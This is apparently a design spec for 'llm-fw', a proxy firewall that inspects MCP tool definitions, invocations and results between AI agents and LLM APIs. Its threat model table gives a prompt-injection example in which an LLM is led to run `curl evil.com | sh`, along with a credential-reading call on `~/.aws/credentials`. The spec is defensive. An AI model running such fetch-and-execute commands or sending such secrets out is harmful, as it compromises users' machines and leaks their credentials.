# MCP (Model Context Protocol) Monitoring & Security Spec

## 1. Overview
The Model Context Protocol (MCP) standardizes how AI agents communicate with local tools, data sources, and APIs. While the actual MCP communication (JSON-RPC over stdio or SSE) happens locally between the Agent and the MCP Server, the **intent** to use a tool is communicated over the network to the LLM (e.g., Anthropic, OpenAI) via function calling (`tool_use`).

By sitting as a proxy between the Agent and the LLM, `llm-fw` has full visibility into:
1. **Tool Definitions**: Which tools the agent tells the LLM it has access to.
2. **Tool Invocations**: The LLM instructing the agent to execute a tool (with arguments).
3. **Tool Results**: The agent sending the output of the tool back to the LLM.

## 2. Goals
1. **Visibility**: Provide a dashboard view of which tools are being exposed to the LLM, invoked by the LLM, and the results returned.
2. **Access Control (Tool Firewall)**: Allow administrators to block specific tool invocations (e.g., `execute_command`, `write_file`) or restrict them based on arguments (e.g., allow `read_file` but block if path contains `/etc/`).
3. **Data Exfiltration Prevention (DLP)**: Scan `tool_result` payloads going *to* the LLM to prevent sensitive local data (e.g., SSH keys read by `read_file`) from being leaked to the cloud model.

## 3. Non-Goals
* **Local Interception**: `llm-fw` will not intercept the local JSON-RPC stdio/SSE traffic between the Agent and the MCP Server. We enforce security purely at the LLM API boundary.
* **Tool Emulation**: The firewall will not execute or mock tools. It only permits, blocks, or redacts the LLM network traffic.

## 4. Threat Model
| Threat | Mitigation |
|--------|------------|
| **Malicious LLM / Prompt Injection** | An attacker injects a prompt causing the LLM to call `execute_command({"cmd": "curl evil.com \| sh"})`. The firewall inspects the `tool_use` response from the LLM and blocks it before it reaches the local agent. |
| **Data Exfiltration via Tool** | The agent executes `read_file({"path": "~/.aws/credentials"})` and sends the result to the LLM. The firewall's DLP scanner inspects the outbound `tool_result` and redacts the secrets. |
| **Unauthorized Tool Access** | An agent exposes a risky tool (like `delete_database`) to the LLM. The firewall blocks the outbound request containing the tool definition. |

## 5. Architecture & Data Flow

1. **Request Interception (Outbound)**
   - `llm-fw` parses the JSON body of requests to `api.anthropic.com` or `api.openai.com`.
   - Extracts `tools` (definitions) and `tool_result` (outputs of previously executed tools).
   - *Action*: Apply URL-Filter/DLP to tool results. Apply Allowlist/Blocklist to tool definitions.

2. **Response Interception (Inbound)**
   - `llm-fw` parses the JSON body of the response from the LLM.
   - Extracts `tool_use` / `function_call` objects.
   - *Action*: Inspect the tool name and arguments. If deemed malicious, rewrite the response to strip the tool call or drop the connection before the agent can execute it.

## 6. Dashboard Integration
* **New Stats**: "Tools Invoked", "Tools Blocked".
* **Event Detail**: A new stage badge `[MCP]` to indicate an event was triggered by a tool call.
* **Payload View**: The dashboard drawer should explicitly format tool arguments and results for easy auditing.
